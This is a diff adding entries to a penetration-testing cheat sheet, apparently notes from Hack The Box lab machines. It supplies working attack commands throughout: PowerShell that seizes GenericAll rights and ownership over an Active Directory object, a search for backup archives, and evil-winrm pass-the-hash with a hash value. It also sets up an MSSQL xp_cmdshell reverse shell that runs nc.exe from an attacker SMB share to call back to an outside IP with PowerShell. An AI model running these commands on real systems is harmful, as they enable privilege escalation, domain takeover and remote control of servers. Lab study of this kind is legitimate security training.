@@ -685,6 +685,20 @@ impacket-dacledit -action 'read' -principal 'source_user' \
     -target 'child_object' -dc-ip <DC_IP> 'domain.com/user:password'
 ```
 
+```
+$objectDN = "CN=Certification Authority,CN=Users,DC=sequel,DC=htb"
+$userSID = "S-1-5-21-548670397-972687484-3496335370-1114"
+$adObject = Get-ADObject -Identity $objectDN
+$acl = Get-Acl -Path "AD:\$objectDN"
+$identity = New-Object System.Security.Principal.SecurityIdentifier($userSID)
+$adRights = [System.DirectoryServices.ActiveDirectoryRights]::GenericAll
+$type = [System.Security.AccessControl.AccessControlType]::Allow
+$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::All
+$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identity, $adRights, $type, $inheritanceType)
+$acl.AddAccessRule($rule)
+Set-Acl -Path "AD:\$objectDN" -AclObject $acl
+```
+
 **Add WriteProperty on specific attribute**
 
 ```bash
@@ -709,6 +723,31 @@ bloodyAD --host <DC_IP> -d domain.com -u user -p 'password' \
 impacket-dacledit -action 'remove' -rights 'FullControl' \
     -principal 'source_user' -target 'target_user' \
     'domain.com/user:password'
+```
+
+#### SetOwner exploit
+
+```
+$acl = Get-ACL "AD:\CN=Certification Authority,CN=Users,DC=sequel,DC=htb"
+$identityReference = New-Object System.Security.Principal.NTAccount("sequel", "ryan")
+$acl.SetOwner($identityReference)
+Set-ACL -Path "AD:\CN=Certification Authority,CN=Users,DC=sequel,DC=htb" -AclObject $acl
+```
+
+#### GenericAll exploit
+
+```
+$objectDN = "CN=Certification Authority,CN=Users,DC=sequel,DC=htb"
+$userSID = "S-1-5-21-548670397-972687484-3496335370-1114"
+$adObject = Get-ADObject -Identity $objectDN
+$acl = Get-Acl -Path "AD:\$objectDN"
+$identity = New-Object System.Security.Principal.SecurityIdentifier($userSID)
+$adRights = [System.DirectoryServices.ActiveDirectoryRights]::GenericAll
+$type = [System.Security.AccessControl.AccessControlType]::Allow
+$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::All
+$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identity, $adRights, $type, $inheritanceType)
+$acl.AddAccessRule($rule)
+Set-Acl -Path "AD:\$objectDN" -AclObject $acl
 ```
 
 ***
@@ -1021,8 +1060,39 @@ evil-winrm -i dc01.haze.htb -u 'edward.martin' -H '09e0b3eeb2e7a6b0d419e9ff8f4d9
 
 ***
 
-## <mark style="color:red;">FILE DISCOVERY</mark>&#x20;
+## <mark style="color:red;">File Discovery</mark>&#x20;
 
 ```
 gci C:\ -Include *.zip, *.bak, *.7z -File -Recurse -ea SilentlyContinue
+```
+
+***
+
+## <mark style="color:red;">User list from ldapdomaindump outfile</mark>
+
+```
+cat ldd/domain_users.grep | cut -f 3 | grep -vE 'rose|sAMA' > users.txt
+```
+
+***
+
+## MSSQL Reverse Shell via SMB share
+
+```
+
+HOST SIDE 
+------------------------------------------------
+cp /usr/share/windows-resources/binaries/nc.exe .
+
+sudo impacket-smbserver -smb2support -username evil -password evil evilshare .
+
+sudo rlwrap nc -lnvp 443
+
+
+TARGET SIDE
+------------------------------------------------------------------------
+SQL (sa dbo@master)> xp_cmdshell net use Z: \\10.10.14.38\evilshare /user:evil evil
+
+SQL (sa  dbo@master)> xp_cmdshell Z:\nc.exe 10.10.14.38 443 -e powershell.exe
+
 ```
